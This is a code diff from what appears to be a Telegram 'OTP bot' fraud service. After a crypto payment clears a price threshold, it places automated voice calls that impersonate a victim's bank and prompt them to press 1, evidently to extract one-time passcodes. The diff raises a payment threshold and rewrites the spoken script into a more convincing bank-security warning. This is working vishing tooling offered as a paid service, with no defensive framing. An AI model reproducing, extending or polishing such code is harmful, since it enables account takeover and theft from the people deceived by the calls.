@@ -359,7 +359,7 @@ class TelegrambotWebhookView(APIView):
                     return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                 if otp_bot.log:
                     if usdvalue >= 24.6:
-                        text = f"Placing call to {phone_number}...."
+                        text = f"Placing call to {phone_number}....☎️"
                         async_to_sync(bot)(chat_id,text)
                         call(phone_number,bank,chat_id) 
                     else:
@@ -367,8 +367,8 @@ class TelegrambotWebhookView(APIView):
                         text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
                         async_to_sync(bot)(chat_id,text)
                 else:
-                    if usdvalue >= 14.6:
-                        text = f"Placing call to {phone_number}...."
+                    if usdvalue >= 29.2:
+                        text = f"Placing call to {phone_number}....☎️"
                         async_to_sync(bot)(chat_id,text)
                         call(phone_number,bank,chat_id)
                     else:
@@ -447,7 +447,7 @@ class SecurityCheck(APIView):
 def voice(request,bank,chat_id):
     resp = VoiceResponse()
     gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/{bank}/')
-    gather.say(f'We have received a login request on your {bank} account. If you did not request an OTP Press 1.')
+    gather.say(f'We have detected a login attempt on your {bank} account, leading us to suspect a possible security breach. If you did not initiate this login request and request an OTP, kindly press 1.')
     resp.append(gather)
     call_status = request.POST.get('CallStatus')
     if call_status == 'in-progress':
